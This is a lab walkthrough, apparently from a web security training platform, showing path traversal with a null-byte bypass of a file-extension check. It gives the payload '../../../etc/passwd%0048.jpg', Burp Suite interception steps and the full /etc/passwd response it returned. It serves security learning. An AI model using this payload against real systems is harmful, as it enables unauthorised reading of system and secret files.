Lab#5 - FIle path traversal, validation of file extension with null byte bypass

Concept : An application may require the user-supplied filename to end with an expected file extension, 
          such as .png. In this case, it might be possible to use a null   byte to effectively terminate 
          the file path before the required extension. For example: filename=../../../etc/passwd%00.png.

          - Path traversal is a vulnerability when an application uses user-controlled input to construct
            file system paths without proper validation.

          - Even developer added all Filters & the url starts with absolute imapge path with specific 
            extenssion : 'image?filename-/var/www/images/cat.jpg' An attacker can manipulate using absolute 
            path + null byte : "%00" to the traversal sequences such as '/image?filename=../../../etc/passwd%0048.jpg' 
            to acces files outside the intended directory.

          - Depending on the application's permissions, they may expose sensitive configuration files,
            system files, or application secrets. 


| Cause                             | Vulnerability       | Impact                 |
| --------------------------------- | ------------------- | ---------------------- |
| User input is not validated       | Path Traversal      | Read sensitive files   |
| Weak file path handling           | Directory Traversal | Information disclosure |
| Excessive application permissions | Increased impact    | Access to more files   |


Target Goal - Retrieve the contents of the /etc/passwd file

Analysis : 
/image?filename=48.jpg   --> /image?filename=../../../etc/passwd%0048.jpg 

Exploit trick : for the absolute start path add this null byte "%00" which makes to ignore after this null byte 
and actual: "../../../etc/passwd" path is traversed.

Manual PenTest via burpsuite :

    1. Setup burpsuite proxy ip : 127.0.0.1 on port : 8080
    2. Now open burpsuite and go to proxies tab to turn on intercept
    3. You will see lot of get request specifically gettting the images with .jpg
       extensions select one such and send that request to repeater.
    4. Switch to Repeater tab & manipulate the URL
        
        URL : GET /image?filename=../../../etc/passwd%0048.jpg HTTP/2 

        Response : 

        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
        peter:x:12001:12001::/home/peter:/bin/bash
        carlos:x:12002:12002::/home/carlos:/bin/bash
        user:x:12000:12000::/home/user:/bin/bash
        elmer:x:12099:12099::/home/elmer:/bin/bash
        academy:x:10000:10000::/academy:/bin/bash
        messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
        dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
        systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
        systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
        systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
        mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
        postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
        usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
        rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
        mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
        avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
        cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
        geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
        saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
        colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
        pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
        gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false